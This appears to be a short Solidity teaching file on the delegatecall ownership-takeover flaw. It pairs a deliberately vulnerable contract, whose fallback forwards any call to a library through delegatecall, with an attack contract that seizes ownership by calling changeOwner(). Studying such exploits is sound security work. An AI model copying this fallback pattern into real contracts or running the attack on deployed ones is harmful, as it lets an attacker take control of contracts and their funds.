// SPDX-License-Identifier: MIT

/* Part 1
receive() external payable : For empty call data (and any value)
fallback() external payable : When no other function matches (not even the receive function). 
Optionally payable.
 */

pragma solidity ^0.8.0;

contract HackMe {

    address public owner;
    Library public lib;

    constructor(Library _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    receive() external payable {}

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Library{
    address public owner;

    function changeOwner() external {
        owner = msg.sender;
    }
}

contract AttackContract{

    address public hackme;

    constructor(address _hackme) {
        hackme = _hackme;
    }

    function attack() external payable {
        hackme.call(abi.encodeWithSignature("changeOwner()"));
    }
}